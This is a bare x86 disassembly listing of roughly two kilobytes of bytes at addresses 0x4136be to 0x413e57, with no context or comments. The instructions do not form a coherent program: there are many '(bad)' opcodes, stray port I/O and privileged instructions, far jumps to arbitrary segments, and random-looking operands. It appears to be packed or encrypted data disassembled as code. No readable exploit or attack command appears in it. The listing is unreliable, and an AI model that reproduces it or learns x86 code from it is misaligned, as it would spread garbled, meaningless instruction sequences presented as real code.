  4136be:	fild   DWORD PTR [ecx+0x55]
  4136c1:	adc    al,0x13
  4136c3:	dec    edx
  4136c4:	ins    DWORD PTR es:[edi],dx
  4136c5:	xor    eax,0x4699ec21
  4136ca:	mov    ch,0x5c
  4136cc:	push   0x10ac7a30
  4136d1:	dec    ecx
  4136d2:	out    0xd9,al
  4136d4:	mov    bl,0xde
  4136d6:	aaa    
  4136d7:	retf   
  4136d8:	jp     0x413707
  4136da:	push   edx
  4136db:	xchg   esi,eax
  4136dc:	dec    ebx
  4136dd:	rcl    DWORD PTR [esi+0x3c],0x1a
  4136e1:	push   0x9
  4136e3:	and    al,0x52
  4136e5:	push   ss
  4136e6:	push   0xa384a336
  4136eb:	imul   esp,esi,0x65
  4136ee:	dec    ecx
  4136ef:	cmp    ebx,esi
  4136f1:	mov    es,esp
  4136f3:	sbb    eax,0x35572d8e
  4136f8:	push   esi
  4136f9:	cwde   
  4136fa:	pop    ebp
  4136fb:	(bad)  
  4136fc:	pop    ebx
  4136fd:	bound  ecx,QWORD PTR [edx+0xe]
  413700:	leave  
  413701:	clc    
  413702:	jmp    DWORD PTR [ecx+edx*2-0x6d]
  413706:	(bad)  
  413707:	cli    
  413708:	add    al,0x7
  41370a:	std    
  41370b:	mov    ecx,DWORD PTR [edi+ebp*8]
  41370e:	ficomp DWORD PTR [edi+eiz*2-0xa38c036]
  413715:	inc    ecx
  413716:	popf   
  413717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413718:	inc    edi
  413719:	mov    ah,0x2e
  41371b:	xor    BYTE PTR [ecx-0xefca247],al
  413721:	push   0x14
  413723:	adc    eax,0x885c5029
  413728:	std    
  413729:	les    esp,FWORD PTR [edi+0x7440f2c4]
  41372f:	mov    ds:0xb7de1ad8,al
  413734:	push   ds
  413735:	int    0xf
  413737:	mov    bl,0xe4
  413739:	retf   
  41373a:	sar    DWORD PTR [edx+0x19],1
  41373d:	int    0x14
  41373f:	nop
  413740:	test   al,cl
  413742:	sar    eax,cl
  413744:	pop    ss
  413745:	sahf   
  413746:	jno    0x413706
  413748:	repnz frstor [esi-0x69b9e4d2]
  41374f:	mov    WORD PTR [esi],ss
  413751:	dec    esi
  413752:	or     edx,eax
  413754:	or     eax,DWORD PTR [ebp+ebp*1-0x7afff451]
  41375b:	loope  0x4137a2
  41375d:	and    dl,BYTE PTR [ecx+0x30]
  413760:	pop    edx
  413761:	jge    0x4136ed
  413763:	jns    0x4137ae
  413765:	arpl   WORD PTR [edx-0x6a],ax
  413768:	pop    eax
  413769:	inc    edi
  41376a:	cmp    al,0xa1
  41376c:	mov    ds:0xff58d56c,al
  413771:	pop    edi
  413772:	test   al,0x6f
  413774:	add    DWORD PTR [edx+0x6d3db9f0],ebx
  41377a:	and    eax,0xa1066e2
  41377f:	icebp  
  413780:	sub    BYTE PTR ds:0xcbbad762,al
  413786:	in     al,dx
  413787:	les    edx,FWORD PTR [eax]
  413789:	fs mov edi,0x19de9c13
  41378f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413790:	ds (bad) 
  413792:	popf   
  413793:	pop    ecx
  413794:	and    al,0xad
  413796:	lea    ecx,[edi+0x7e]
  413799:	sahf   
  41379a:	xchg   esi,eax
  41379b:	scas   al,BYTE PTR es:[edi]
  41379c:	pop    ebp
  41379d:	and    ecx,DWORD PTR [ecx-0x11]
  4137a0:	cld    
  4137a1:	pushf  
  4137a2:	cmp    al,0x9e
  4137a4:	dec    eax
  4137a5:	xor    DWORD PTR [eax],0xffffffa7
  4137a8:	pop    ss
  4137a9:	das    
  4137aa:	push   eax
  4137ab:	sub    eax,0x9408413f
  4137b0:	loopne 0x41380e
  4137b2:	cmp    cl,BYTE PTR [edx-0x6b62adda]
  4137b8:	fbld   TBYTE PTR [ebp-0x3c]
  4137bb:	in     al,0xfb
  4137bd:	dec    ebp
  4137be:	pushf  
  4137bf:	aas    
  4137c0:	jmp    FWORD PTR [ebx-0x67]
  4137c3:	scas   eax,DWORD PTR es:[edi]
  4137c4:	add    al,0x42
  4137c6:	test   eax,esi
  4137c8:	(bad)  
  4137c9:	pop    ebx
  4137ca:	ret    
  4137cb:	fist   DWORD PTR [ebp-0x7e]
  4137ce:	xchg   BYTE PTR [edx-0x4],dh
  4137d1:	push   ecx
  4137d2:	lods   eax,DWORD PTR ds:[esi]
  4137d3:	mov    cl,0x2
  4137d5:	or     al,ch
  4137d7:	sbb    al,0xb9
  4137d9:	mov    ebp,0xa5fd6724
  4137de:	mov    al,0x21
  4137e0:	push   esp
  4137e1:	in     eax,dx
  4137e2:	test   DWORD PTR [esi+0x2f4ab099],esi
  4137e8:	aam    0xb
  4137ea:	xchg   DWORD PTR [edi],edi
  4137ec:	dec    edi
  4137ed:	jae    0x4137f9
  4137ef:	xor    ebx,DWORD PTR ds:[eax-0x22623760]
  4137f6:	jb     0x413847
  4137f8:	add    ebx,DWORD PTR [ebx+0x1f]
  4137fb:	jnp    0x41378b
  4137fd:	(bad)  
  4137fe:	sub    eax,0x51b75579
  413803:	add    ebp,ebx
  413805:	jmp    0x2549:0x7e6b843c
  41380c:	lss    ebx,FWORD PTR [edi-0x28]
  413810:	aas    
  413811:	sahf   
  413812:	xor    DWORD PTR [ebx+0x3697770f],0x7bc6f13c
  41381c:	lea    edi,[eax]
  41381e:	inc    esp
  41381f:	inc    edi
  413820:	pusha  
  413821:	push   es
  413822:	test   BYTE PTR [esi],bh
  413824:	lods   al,BYTE PTR ds:[esi]
  413825:	and    DWORD PTR [ebp+0x1c],esi
  413828:	aas    
  413829:	push   ecx
  41382a:	adc    DWORD PTR [edi],eax
  41382c:	sbb    BYTE PTR [edx+0x5b],0xe5
  413830:	adc    eax,0x2e9f8a6b
  413835:	loop   0x4137f6
  413837:	sbb    ebp,ecx
  413839:	xchg   ecx,eax
  41383a:	stos   DWORD PTR es:[edi],eax
  41383b:	mov    al,ds:0x3c73b47d
  413840:	xchg   edi,eax
  413841:	xchg   esp,eax
  413842:	ins    BYTE PTR es:[edi],dx
  413843:	or     ecx,DWORD PTR [ecx+0x43]
  413846:	push   eax
  413847:	ins    DWORD PTR es:[edi],dx
  413848:	stos   BYTE PTR es:[edi],al
  413849:	in     al,dx
  41384a:	push   0xc
  41384c:	mov    cl,0xd2
  41384e:	and    bh,dh
  413850:	pop    ss
  413851:	sub    BYTE PTR [edx-0x383477b8],bl
  413857:	or     BYTE PTR [ebx+0x2b],ch
  41385a:	jns    0x413821
  41385c:	push   ds
  41385d:	seto   BYTE PTR [edi]
  413860:	stc    
  413861:	pop    esi
  413862:	cmp    al,0xcd
  413864:	(bad)
  413868:	imul   ebp,edx,0xffffff8b
  41386b:	imul   edi,DWORD PTR [esi-0x27],0x6e2740cf
  413872:	dec    ecx
  413873:	int    0xe1
  413875:	test   al,0x33
  413877:	test   BYTE PTR [ecx],cl
  413879:	hlt    
  41387a:	sub    al,0x4
  41387c:	xchg   edi,eax
  41387d:	clc    
  41387e:	test   BYTE PTR [esi+0x20],bh
  413881:	fiadd  DWORD PTR [ebp*4+0x43d934a2]
  413888:	int3   
  413889:	add    ebp,DWORD PTR [ecx+0x44]
  41388c:	lds    ebx,FWORD PTR [ebx-0x1f89d52]
  413892:	jno    0x413829
  413894:	mov    BYTE PTR [edx+0x1fe545f1],ch
  41389a:	cmp    DWORD PTR [esi],esi
  41389c:	daa    
  41389d:	fsub   QWORD PTR [eax+0x505d1aa1]
  4138a3:	pop    ss
  4138a4:	add    BYTE PTR [esi+0x20],cl
  4138a7:	call   0x8311:0xb1c7d7fc
  4138ae:	or     eax,DWORD PTR [edx]
  4138b0:	popa   
  4138b1:	add    ecx,edi
  4138b3:	ficom  WORD PTR [eax]
  4138b5:	fmul   QWORD PTR [esi+ebp*1+0x388830cc]
  4138bc:	sub    BYTE PTR [ebp+0xfda147],ah
  4138c2:	xchg   DWORD PTR [ecx],esp
  4138c4:	cmc    
  4138c5:	shl    BYTE PTR ds:0x334c56cc,1
  4138cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138cc:	add    eax,0xf202dc21
  4138d1:	mov    fs,WORD PTR [ecx-0x59]
  4138d4:	dec    ebp
  4138d5:	iret   
  4138d6:	ds mov ch,0x8a
  4138d9:	gs es inc ebp
  4138dc:	pop    esi
  4138dd:	lods   al,BYTE PTR ds:[esi]
  4138de:	push   0xae18c297
  4138e3:	push   edx
  4138e4:	clc    
  4138e5:	sub    eax,0xe7d41281
  4138ea:	pop    es
  4138eb:	add    al,bl
  4138ed:	fstp   DWORD PTR [edx+0x1e]
  4138f0:	mov    al,0x4
  4138f2:	or     cl,dl
  4138f4:	add    al,BYTE PTR [ecx+0x1b]
  4138f7:	pop    ss
  4138f8:	xor    al,0xf
  4138fa:	xchg   ecx,eax
  4138fb:	or     DWORD PTR [eax+0x62],ecx
  4138fe:	push   ss
  4138ff:	jg     0x413901
  413901:	jmp    0x413950
  413903:	push   ss
  413904:	imul   edx,DWORD PTR [esi],0x4b28d374
  41390a:	inc    eax
  41390b:	push   ebp
  41390c:	arpl   sp,di
  41390e:	cmp    al,bh
  413910:	sbb    eax,0x2a9bef21
  413915:	push   es
  413916:	mov    ds:0x85e8fdd1,eax
  41391b:	test   al,0xe6
  41391d:	mov    cl,0xe7
  41391f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413920:	pop    es
  413921:	ret    0x1ad9
  413924:	test   BYTE PTR [esi+0x5edba170],ah
  41392a:	pop    ebx
  41392b:	mov    ebx,0x76f2763b
  413930:	xchg   edi,eax
  413931:	xor    dh,BYTE PTR [ebx]
  413933:	add    BYTE PTR [edi-0x4b],ah
  413936:	mov    ds:0xb805f0e5,al
  41393b:	and    bl,bl
  41393d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41393e:	jecxz  0x4138cc
  413940:	mov    dh,BYTE PTR [ecx+edi*4]
  413943:	inc    ecx
  413944:	stc    
  413945:	(bad)  
  413946:	mul    BYTE PTR [ebx-0x36]
  413949:	jmp    0x41396a
  41394b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41394c:	leave  
  41394d:	mov    al,0x66
  41394f:	mov    ah,0xc6
  413951:	mov    ch,0x1f
  413953:	ror    BYTE PTR [edx],cl
  413955:	fadd   st(2),st
  413957:	mov    ds,WORD PTR [eax]
  413959:	push   ebx
  41395a:	rcl    BYTE PTR [ebp-0x38],1
  41395d:	jge    0x41399a
  41395f:	in     al,0x7
  413961:	enter  0x855c,0xfc
  413965:	sbb    al,0xa1
  413967:	inc    ecx
  413968:	sbb    DWORD PTR [ecx+0x42],esp
  41396b:	xor    al,0x99
  41396d:	shr    DWORD PTR [eax-0x6f],cl
  413970:	push   ecx
  413971:	ins    DWORD PTR es:[edi],dx
  413972:	push   ds
  413973:	push   0x6499882d
  413978:	jne    0x413954
  41397a:	imul   edi,DWORD PTR [edi-0xed389c3],0x7ae2a38a
  413984:	frstor [ecx-0x26]
  413987:	(bad)  
  41398a:	nop
  41398b:	mov    ebx,0x9a7003
  413990:	test   al,0x8
  413992:	xlat   BYTE PTR ds:[ebx]
  413993:	jl     0x4139c9
  413995:	mov    eax,ds:0xa5c23fd6
  41399a:	fmul   QWORD PTR [edi-0x75]
  41399d:	mov    eax,ds:0xee94350d
  4139a2:	call   0x82cd3ff4
  4139a7:	(bad)  
  4139a8:	cld    
  4139a9:	mov    es,WORD PTR [ecx+0x39d14081]
  4139af:	das    
  4139b0:	xor    cl,BYTE PTR [eax]
  4139b2:	fld    QWORD PTR [ebp+0x2c]
  4139b6:	xchg   ebx,eax
  4139b7:	pop    edx
  4139b8:	retf   
  4139b9:	mov    eax,esp
  4139bb:	int    0x8a
  4139bd:	inc    ecx
  4139be:	inc    ecx
  4139bf:	jecxz  0x413a2f
  4139c1:	dec    ebx
  4139c3:	add    al,0x60
  4139c5:	adc    BYTE PTR [ecx+eiz*4+0x12],ch
  4139c9:	mov    dl,0x36
  4139cb:	lods   eax,DWORD PTR ds:[esi]
  4139cc:	xchg   edx,eax
  4139cd:	mov    WORD PTR [esi-0x634d978b],es
  4139d3:	xchg   esp,eax
  4139d4:	jno    0x413a0b
  4139d6:	aas    
  4139d7:	or     eax,0x2d980cac
  4139dc:	and    esp,edi
  4139de:	or     ah,BYTE PTR gs:[bx+di]
  4139e2:	shl    DWORD PTR [ecx+0x7343a288],1
  4139e8:	stc    
  4139e9:	repnz in al,dx
  4139eb:	div    DWORD PTR [ecx-0x41f9ffb7]
  4139f1:	adc    BYTE PTR [edi+ebx*8-0x15],0x5b
  4139f6:	xchg   ebx,eax
  4139f7:	daa    
  4139f8:	pop    esp
  4139f9:	push   ecx
  4139fa:	xchg   esp,eax
  4139fb:	aad    0xde
  4139fd:	push   ecx
  4139fe:	adc    dl,BYTE PTR [esi-0x78]
  413a01:	and    eax,0xc7927aa4
  413a06:	adc    eax,0x4c764b3
  413a0b:	jmp    0x413a75
  413a0d:	cmp    edi,ecx
  413a0f:	sub    esp,esi
  413a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a12:	out    dx,eax
  413a13:	push   ss
  413a14:	pop    ds
  413a15:	aas    
  413a16:	inc    esi
  413a17:	popf   
  413a18:	daa    
  413a19:	adc    dl,BYTE PTR [ebx+0x58]
  413a1c:	jb     0x4139a9
  413a1e:	or     edx,DWORD PTR [edx+0x29]
  413a21:	stos   DWORD PTR es:[edi],eax
  413a22:	stc    
  413a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a24:	jnp    0x413a6d
  413a26:	jge    0x413a98
  413a28:	add    BYTE PTR gs:[ebp+0x61cc76a3],dl
  413a2f:	enter  0x3ad1,0x79
  413a33:	loop   0x413a8f
  413a35:	push   cs
  413a36:	outs   dx,DWORD PTR ds:[esi]
  413a37:	ins    BYTE PTR es:[edi],dx
  413a38:	ss add eax,0xb453aa65
  413a3e:	shr    dh,0x3d
  413a41:	xor    eax,0x7c3daa5d
  413a46:	cmp    esp,DWORD PTR [edi+0x1c]
  413a49:	jmp    0x286b:0x70180127
  413a50:	pop    esp
  413a51:	xor    DWORD PTR [ebp-0x2a],ebx
  413a54:	dec    eax
  413a55:	cld    
  413a56:	enter  0x528a,0x77
  413a5a:	test   bh,bh
  413a5c:	test   DWORD PTR [esi],edi
  413a5e:	adc    BYTE PTR [edx-0x7dfbea0c],bl
  413a64:	loope  0x413a09
  413a66:	lock adc al,0xef
  413a69:	neg    BYTE PTR [ecx]
  413a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a6c:	mov    edi,0x1508d537
  413a71:	shr    DWORD PTR [ecx],cl
  413a73:	jb     0x413a20
  413a75:	sub    ah,al
  413a77:	int    0xdb
  413a79:	out    0xce,al
  413a7b:	mov    ?,WORD PTR [esi-0x72]
  413a7e:	sbb    DWORD PTR [ecx+0x4c165c6],ecx
  413a84:	xor    al,0x79
  413a86:	push   ecx
  413a87:	xlat   BYTE PTR ds:[ebx]
  413a88:	out    dx,eax
  413a89:	mov    cl,0x14
  413a8b:	xor    al,0x98
  413a8d:	xlat   BYTE PTR ds:[ebx]
  413a8e:	mov    ds:0xb229d27,eax
  413a93:	mov    ecx,esi
  413a95:	das    
  413a96:	inc    BYTE PTR [ebp-0x6569fa45]
  413a9c:	sub    al,0xe2
  413a9e:	pop    fs
  413aa0:	scas   eax,DWORD PTR es:[edi]
  413aa1:	or     bl,ah
  413aa3:	adc    edi,0xffffffa8
  413aa6:	xor    DWORD PTR [edx+0x3e16e900],0xc8c45728
  413ab0:	pop    ss
  413ab1:	mov    gs,WORD PTR [edi]
  413ab3:	xchg   esi,eax
  413ab4:	iret   
  413ab5:	push   edi
  413ab6:	sub    dl,0xa2
  413ab9:	pop    esi
  413aba:	into   
  413abb:	ret    
  413abc:	xor    edx,edx
  413abe:	nop
  413abf:	push   ds
  413ac0:	cmp    edi,DWORD PTR [ebp+0x6]
  413ac3:	push   cs
  413ac4:	das    
  413ac5:	(bad)  
  413ac6:	cmp    DWORD PTR [ecx-0x252e9e1e],0x6a70b63c
  413ad0:	les    ebp,FWORD PTR [edi+0x67]
  413ad3:	adc    ebx,ecx
  413ad5:	xchg   BYTE PTR [esi],cl
  413ad7:	and    DWORD PTR [edx-0x77e77cb6],0xffffff87
  413ade:	(bad)  
  413adf:	lds    ecx,FWORD PTR [eax+0x29]
  413ae2:	pop    ecx
  413ae4:	push   cs
  413ae5:	mov    eax,ds:0xf55ef3da
  413aea:	test   eax,0x1fc48908
  413aef:	les    ebp,FWORD PTR [edx]
  413af1:	mov    eax,0x34612c0a
  413af6:	pop    ebx
  413af7:	(bad)  
  413af8:	pop    esi
  413af9:	inc    edx
  413afa:	sbb    al,0xac
  413afc:	mov    al,ds:0x8d1ff49f
  413b01:	mov    ch,cl
  413b03:	pushf  
  413b04:	cmp    DWORD PTR [ebp-0x35ac865],0x3
  413b0b:	pop    esp
  413b0c:	cmp    DWORD PTR [eax+0x56],eax
  413b0f:	mov    edx,0x800a17d6
  413b14:	dec    esi
  413b15:	push   es
  413b16:	out    dx,al
  413b17:	mov    ss,esi
  413b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b1a:	mov    esi,DWORD PTR [edx+ecx*4]
  413b1d:	and    eax,DWORD PTR [edi+0x1f05a77b]
  413b23:	call   0xf87d046e
  413b28:	inc    ebp
  413b29:	mov    ss,esp
  413b2b:	scas   eax,DWORD PTR es:[edi]
  413b2c:	addr16 fs push esi
  413b2f:	pop    ss
  413b30:	mov    ds:0xbf0db1b7,eax
  413b35:	sub    al,0xbf
  413b37:	mov    DWORD PTR [edx-0x2e],edx
  413b3a:	out    dx,al
  413b3b:	pop    esi
  413b3c:	(bad)  
  413b3e:	mov    ebp,0x65e6c748
  413b43:	imul   ebp,DWORD PTR [eax],0xcbbe3162
  413b49:	dec    esp
  413b4a:	test   al,0xc3
  413b4c:	cmp    DWORD PTR [eax],eax
  413b4e:	pop    eax
  413b4f:	mov    ecx,0xc86fc939
  413b54:	mov    ebx,0x683f99d2
  413b59:	dec    eax
  413b5a:	and    esi,edx
  413b5c:	adc    ecx,DWORD PTR [ecx]
  413b5e:	pusha  
  413b5f:	cmp    al,0x3d
  413b61:	jnp    0x413b0a
  413b63:	sub    al,0xf1
  413b65:	(bad)  
  413b66:	gs mov edx,0x62120732
  413b6c:	add    al,0x7f
  413b6e:	cwde   
  413b6f:	(bad)  
  413b71:	push   esp
  413b72:	iret   
  413b73:	sbb    DWORD PTR [esi-0x2e285635],0x64088893
  413b7d:	add    dl,dh
  413b7f:	js     0x413b6a
  413b81:	sbb    BYTE PTR [edi],ah
  413b83:	arpl   WORD PTR [edi+0x1d],si
  413b86:	loopne 0x413b88
  413b88:	loopne 0x413b3c
  413b8a:	jo     0x413be9
  413b8c:	fsub   QWORD PTR [edi+0x6223acf0]
  413b92:	xchg   esp,eax
  413b93:	mov    DWORD PTR [ebx-0x3d60caeb],edi
  413b99:	add    BYTE PTR [eax],ch
  413b9b:	(bad)  [edi+ebp*8-0x77]
  413b9f:	mov    bh,ch
  413ba1:	fcomp  DWORD PTR [esp+edx*4+0x6c3b412f]
  413ba8:	pop    ebx
  413ba9:	and    BYTE PTR [edi],dh
  413bab:	sub    eax,0x368afc36
  413bb0:	repnz sub BYTE PTR [ebp-0x5e],dh
  413bb4:	xor    dl,dl
  413bb6:	jns    0x413c2c
  413bb8:	int3   
  413bb9:	sar    DWORD PTR [edx+ebp*2-0x5dd14e57],1
  413bc0:	dec    esp
  413bc1:	scas   al,BYTE PTR es:[edi]
  413bc2:	mov    ebp,0xf87e4aec
  413bc7:	shl    BYTE PTR [ebp-0x1212f068],cl
  413bcd:	leave  
  413bce:	cs dec edi
  413bd0:	jb     0x413bd2
  413bd2:	std    
  413bd3:	sahf   
  413bd4:	(bad)  [edi]
  413bd6:	enter  0x8dda,0xfc
  413bda:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bdc:	retf   0x1687
  413bdf:	repz ja 0x413c3f
  413be2:	dec    eax
  413be3:	stos   DWORD PTR es:[edi],eax
  413be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413be5:	mov    ebp,0x28baa6b7
  413bea:	sub    al,0xb
  413bec:	inc    ecx
  413bed:	loopne 0x413bb7
  413bef:	mov    bh,0x1b
  413bf1:	add    DWORD PTR [eax+ebx*1-0x5a],ebx
  413bf5:	(bad)  
  413bf6:	in     al,0x3
  413bf8:	inc    esp
  413bf9:	mov    ch,0x5c
  413bfb:	mov    BYTE PTR [edx-0x51890ab9],ch
  413c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c02:	(bad)  
  413c04:	leave  
  413c05:	inc    ebx
  413c06:	jl     0x413bf4
  413c08:	jecxz  0x413c73
  413c0a:	outs   dx,DWORD PTR ds:[esi]
  413c0b:	inc    eax
  413c0c:	mov    cl,0xd8
  413c0e:	aam    0x4d
  413c10:	imul   ecx,DWORD PTR [edx+edx*2],0x5f
  413c14:	xor    BYTE PTR [ecx+0x4e47520],bh
  413c1a:	push   0x732157ce
  413c1f:	mov    ah,BYTE PTR [edx]
  413c21:	ins    BYTE PTR es:[edi],dx
  413c22:	shl    BYTE PTR [ebp+0x4dd725c],cl
  413c28:	push   ds
  413c29:	test   BYTE PTR [esi],0x66
  413c2c:	nop
  413c2d:	push   es
  413c2e:	cmc    
  413c2f:	rcl    BYTE PTR [esi+0x37235f7f],cl
  413c35:	stc    
  413c36:	xchg   esp,eax
  413c37:	mov    bh,0xfd
  413c39:	ret    
  413c3a:	rep lods eax,DWORD PTR ds:[esi]
  413c3c:	mov    al,ds:0x49e9fbf2
  413c41:	mov    esp,0xc8eb89c9
  413c46:	popa   
  413c47:	cwde   
  413c48:	jbe    0x413c5d
  413c4a:	cmp    BYTE PTR [esi+0x2f],dl
  413c4d:	mov    edx,0xcc29b952
  413c52:	inc    edx
  413c53:	cmp    ebx,ebp
  413c55:	mov    dl,0x41
  413c57:	lods   eax,DWORD PTR ds:[esi]
  413c58:	sbb    eax,edx
  413c5a:	fwait
  413c5b:	or     dh,bh
  413c5d:	pop    edi
  413c5e:	sbb    bl,BYTE PTR [eax-0x1f]
  413c61:	nop
  413c62:	add    esp,DWORD PTR [edi-0x7d]
  413c65:	sbb    DWORD PTR [esi+0x31],0xffffff84
  413c69:	adc    BYTE PTR [edx+0x3e],bh
  413c6c:	push   ebx
  413c6d:	aam    0x3d
  413c6f:	sub    edx,DWORD PTR [ebx+0x7d280215]
  413c75:	jae    0x413c40
  413c77:	(bad)  
  413c79:	add    DWORD PTR [edx+edi*1+0x6dfbb3da],ebp
  413c80:	imul   ecx,DWORD PTR [ebx+0x5da9839a],0xffffffde
  413c87:	jl     0x413c5a
  413c89:	or     eax,0xfb18ecb2
  413c8e:	in     al,dx
  413c8f:	xchg   ebp,eax
  413c90:	ret    
  413c91:	(bad)  
  413c93:	icebp  
  413c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c95:	nop
  413c96:	out    0x96,al
  413c98:	fwait
  413c99:	nop
  413c9a:	mov    al,ds:0x344d52fe
  413c9f:	and    edx,DWORD PTR [esi-0x68774440]
  413ca5:	fimul  DWORD PTR [edi-0x327ea0b5]
  413cab:	outs   dx,DWORD PTR ds:[esi]
  413cac:	xchg   BYTE PTR [ecx-0x399ee143],al
  413cb2:	pop    es
  413cb3:	add    eax,0x34239e78
  413cb8:	jl     0x413d28
  413cba:	dec    edi
  413cbb:	inc    ebp
  413cbc:	mov    eax,ds:0x58303aab
  413cc1:	push   ebp
  413cc2:	(bad)  
  413cc3:	idiv   BYTE PTR [ebx]
  413cc5:	sbb    eax,0xa95250aa
  413cca:	dec    esi
  413ccb:	arpl   cx,si
  413ccd:	test   BYTE PTR [ebx+0x7366521e],0xfb
  413cd4:	push   ds
  413cd5:	scas   al,BYTE PTR es:[edi]
  413cd6:	in     al,0x72
  413cd8:	cmc    
  413cd9:	test   al,0xaa
  413cdb:	outs   dx,DWORD PTR ds:[esi]
  413cdc:	adc    al,0x6e
  413cde:	out    dx,al
  413cdf:	jmp    0x7013:0x5aa052d2
  413ce6:	ss sti 
  413ce8:	adc    ebx,eax
  413cea:	test   DWORD PTR [edx-0x527af75e],ebp
  413cf0:	pop    es
  413cf1:	sub    DWORD PTR [ecx-0x59],0xdc6e761c
  413cf8:	push   edi
  413cf9:	push   ds
  413cfa:	sbb    edi,DWORD PTR [ebx-0x44b53941]
  413d00:	or     BYTE PTR [ebx+0x74],ah
  413d03:	gs push esi
  413d05:	inc    eax
  413d06:	xor    DWORD PTR [ebp+eax*1-0x4e73e631],eax
  413d0d:	out    dx,eax
  413d0e:	mov    ebx,0x630d496d
  413d13:	lahf   
  413d14:	push   ebx
  413d15:	loop   0x413cd0
  413d17:	jmp    0x413d72
  413d19:	mov    cs,WORD PTR [eax]
  413d1b:	cli    
  413d1c:	addr16 inc edx
  413d1e:	xchg   ebp,eax
  413d1f:	les    esp,FWORD PTR [ebx]
  413d21:	push   0xffffffb0
  413d23:	mov    dh,0x53
  413d25:	cmc    
  413d26:	mov    WORD PTR [ebx-0x4d],?
  413d29:	or     dh,BYTE PTR [ebx-0x8c706d6]
  413d2f:	cmp    bh,0x93
  413d32:	imul   ecx,esi,0xc26ab120
  413d38:	inc    ecx
  413d39:	xor    eax,0xb5c703a9
  413d3e:	push   ecx
  413d3f:	retf   
  413d40:	in     eax,0x59
  413d42:	dec    edi
  413d43:	out    dx,eax
  413d44:	mov    ch,0x2d
  413d46:	in     al,dx
  413d47:	mov    dh,0xd7
  413d49:	jb     0x413d1c
  413d4b:	push   esp
  413d4c:	btc    eax,edx
  413d4f:	adc    bh,bh
  413d51:	push   esp
  413d52:	scas   al,BYTE PTR es:[edi]
  413d53:	xchg   esp,eax
  413d54:	frstor [eax-0x16fc651]
  413d5a:	inc    ebx
  413d5b:	cdq    
  413d5c:	loope  0x413d7d
  413d5e:	mov    ebp,0x362b0796
  413d63:	fcomp  DWORD PTR [edi+0x77]
  413d66:	sahf   
  413d67:	std    
  413d68:	pop    eax
  413d69:	mov    edx,0x8e4daeb3
  413d6e:	push   edx
  413d6f:	add    BYTE PTR [eax],ah
  413d71:	xor    BYTE PTR [ebp+0x4408e90d],al
  413d77:	fldcw  WORD PTR [edx-0xeb47258]
  413d7d:	push   edi
  413d7e:	push   eax
  413d7f:	push   edi
  413d80:	or     eax,ecx
  413d82:	mov    ds:0x9e9c2f68,al
  413d87:	sbb    bl,BYTE PTR ds:[edx]
  413d8a:	lahf   
  413d8b:	jbe    0x413d7e
  413d8d:	test   al,0x38
  413d8f:	sub    ah,dh
  413d91:	jg     0x413d38
  413d93:	push   0xfffffff9
  413d95:	mov    cl,0x8f
  413d97:	and    edx,DWORD PTR [esi+0xf]
  413d9a:	mov    ebx,0xfdddcdc3
  413d9f:	jle    0x413d3d
  413da1:	mov    al,0xf3
  413da3:	push   0x4c
  413da5:	pop    esp
  413da6:	or     DWORD PTR [ebx+0x26],0x38727e6
  413dad:	push   es
  413dae:	pop    ecx
  413daf:	ins    DWORD PTR es:[edi],dx
  413db0:	and    al,0xe8
  413db2:	neg    BYTE PTR [ecx+eiz*8]
  413db5:	push   0xffffffab
  413db7:	in     eax,dx
  413db8:	inc    esi
  413db9:	shr    ebp,0x2
  413dbc:	cmp    edx,esp
  413dbe:	pop    ecx
  413dbf:	add    eax,DWORD PTR [edi]
  413dc1:	mov    ebx,0xd48375c0
  413dc6:	js     0x413d9f
  413dc8:	(bad)  
  413dc9:	jae    0x413da1
  413dcb:	pop    eax
  413dcc:	cmp    esi,edi
  413dce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dcf:	and    al,BYTE PTR cs:[edx+0x38]
  413dd3:	or     dl,BYTE PTR [edx+0x5f]
  413dd6:	lds    ebx,FWORD PTR [eax]
  413dd8:	les    esi,FWORD PTR [ebx]
  413dda:	dec    ebp
  413ddb:	xchg   ebx,eax
  413ddc:	pushf  
  413ddd:	ret    
  413dde:	popa   
  413ddf:	std    
  413de0:	mov    edx,0x37709405
  413de5:	jnp    0x413e2f
  413de7:	mov    eax,ds:0x9271c1c2
  413dec:	add    eax,0xd35f86c
  413df1:	je     0x413e25
  413df3:	mov    al,ds:0x4bb8980e
  413df8:	push   edx
  413df9:	mov    bl,0xd8
  413dfb:	sub    cl,BYTE PTR [edi-0x739e6c53]
  413e01:	pop    edi
  413e02:	pop    DWORD PTR [edx+0x5fcfd62a]
  413e08:	(bad)  
  413e09:	leave  
  413e0a:	clc    
  413e0b:	add    ecx,ebx
  413e0d:	mov    edi,0x81b52bcf
  413e12:	ret    0xc36d
  413e15:	clc    
  413e16:	aaa    
  413e17:	mov    fs,WORD PTR [edi+0x6e461b10]
  413e1d:	inc    eax
  413e1e:	mov    bl,0xd1
  413e20:	ins    DWORD PTR es:[edi],dx
  413e21:	mov    ?,WORD PTR [esi]
  413e23:	push   es
  413e24:	xchg   ebp,eax
  413e25:	test   al,0xa0
  413e27:	fbld   TBYTE PTR [eax]
  413e29:	mov    ecx,0xb1b94d5c
  413e2e:	jnp    0x413dc4
  413e30:	fcom   QWORD PTR [esp+esi*8]
  413e33:	jo     0x413e05
  413e35:	ss inc esp
  413e37:	mov    bh,0x22
  413e39:	and    DWORD PTR [ecx-0x1a70d372],0x5509605d
  413e43:	or     eax,0xba6a19f7
  413e48:	push   esp
  413e49:	outs   dx,BYTE PTR ds:[esi]
  413e4a:	dec    ecx
  413e4b:	adc    eax,0x4562c9f2
  413e50:	jae    0x413df7
  413e52:	pop    ebx
  413e53:	pop    es
  413e54:	mov    al,0x3
  413e56:	xchg   ecx,eax
  413e57:	daa    
